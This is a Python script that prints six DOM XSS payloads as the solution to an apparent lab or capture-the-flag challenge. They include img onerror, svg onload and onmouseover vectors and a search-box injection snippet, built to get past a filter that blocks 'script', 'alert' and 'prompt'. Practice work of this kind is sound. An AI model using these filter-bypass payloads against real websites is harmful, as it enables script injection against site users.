#!/usr/bin/env python3
"""
DOM XSS Challenge Solver - Working Solution
The key is to use payloads that bypass the server filter
"""

print("="*60)
print("🎯 DOM XSS CHALLENGE - WORKING SOLUTION")
print("="*60)

print("\nThe server blocks 'script', 'alert', and 'prompt'.")
print("But we can use other JavaScript events!\n")

print("SOLUTION 1: Using confirm() instead of alert()")
print("-"*50)
print("In the browser console, paste this:")
print("""
window.location.href = "#/search?q=<img src=x onerror=confirm(1)>"
""")

print("\nSOLUTION 2: Using console.log() - no popup needed")
print("-"*50)
print("In the browser console, paste this:")
print("""
window.location.href = "#/search?q=<img src=x onerror=console.log('XSS')>"
""")

print("\nSOLUTION 3: Try without any JavaScript function")
print("-"*50)
print("In the browser console, paste this:")
print("""
window.location.href = "#/search?q=<img src=x onerror=document.body.style.background='red'>"
""")

print("\nSOLUTION 4: Using a different event handler")
print("-"*50)
print("In the browser console, paste this:")
print("""
window.location.href = "#/search?q=<img src=x onmouseover=confirm(1)>"
""")
print("Then move your mouse over the broken image icon")

print("\nSOLUTION 5: Try a completely different tag")
print("-"*50)
print("In the browser console, paste this:")
print("""
window.location.href = "#/search?q=<svg onload=confirm(1)>"
""")

print("\nSOLUTION 6: Direct search box manipulation")
print("-"*50)
print("In the browser console, paste this:")
print("""
// Click on the search icon first to open the search box
document.querySelector('[aria-label="Open Search"]').click();
setTimeout(() => {
    var searchInput = document.querySelector('input[type="search"]');
    searchInput.value = '<img src=x onerror=confirm(1)>';
    searchInput.dispatchEvent(new Event('input', { bubbles: true }));
    searchInput.form.submit();
}, 500);
""")

print("\n" + "="*60)
print("💡 MOST LIKELY TO WORK:")
print("="*60)
print("\nTry this one first - using confirm() instead of alert():\n")
print('window.location.href = "#/search?q=<img src=x onerror=confirm(1)>"')
print("\nIf that doesn't work, try:")
print('window.location.href = "#/search?q=<svg onload=confirm(1)>"')